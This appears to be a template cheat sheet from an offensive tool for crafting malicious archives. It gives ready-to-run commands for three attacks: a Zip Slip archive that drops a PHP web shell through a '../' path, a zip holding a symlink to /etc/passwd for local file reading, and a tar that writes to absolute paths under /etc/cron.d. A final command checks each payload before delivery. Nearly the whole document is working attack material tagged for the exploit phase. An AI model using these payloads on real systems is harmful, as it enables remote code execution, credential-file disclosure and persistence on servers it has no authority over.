# Zip Slip & Symlink Archive Tricks

> Craft malicious archives that escape extraction directories or follow symlinks

<!-- tags: zip-slip, symlink, lfi, archive, vuln, web -->

---

## Zip Slip Path Traversal Payload
Create an archive whose entry filename contains `../` to write outside the extract dir.

```bash
echo '<?php echo system($_GET["cmd"]);?>' > '../shell.php' && zip {{OUTFILE:file:zipslip.zip}} '../shell.php'
```

<!-- meta: risk=high | phase=exploit | tags=zip-slip,traversal,php -->

---

## Symlink LFI via Zip
Create a symlink to a sensitive file then archive the symlink to read it via upload+extract.

```bash
ln -sf /etc/passwd passwd.txt && zip --symlinks {{OUTFILE:file:lfi.zip}} passwd.txt
```

<!-- meta: risk=high | phase=exploit | tags=symlink,lfi,zip -->

---

## Tar with Absolute Path
Build a tar archive that writes to absolute paths on extraction.

```bash
tar -cvf {{OUTFILE:file:abs.tar}} -P /etc/cron.d/{{TASK:str:rooted}}
```

<!-- meta: risk=high | phase=exploit | tags=tar,absolute,traversal -->

---

## Verify Archive Contents
List entries to confirm traversal or symlink payload before delivering.

```bash
unzip -l {{INFILE:file:zipslip.zip}}
```

<!-- meta: risk=safe | phase=misc | tags=unzip,verify,list -->
